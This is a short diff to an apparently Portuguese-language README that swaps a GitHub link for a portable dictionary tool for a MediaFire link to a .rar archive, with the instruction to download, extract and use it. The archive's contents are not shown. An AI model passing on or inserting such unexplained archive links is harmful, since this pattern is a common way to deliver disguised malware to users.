@@ -9,9 +9,9 @@
 
 A versão pronta para usar está aqui:
 
-👉 **[github.com/vinicius-9/Dicionario-Portable](https://github.com/vinicius-9/Dicionario-Portable)**
+👉 **[https://www.mediafire.com/file/unh7fdxepzzse20/Dicionario-Portable.rar/file)**
 
-Baixe, extraia e use. Sem instalar nada.
+Baixe, extraia e use.  Sem instalar nada.
 
 
 ---
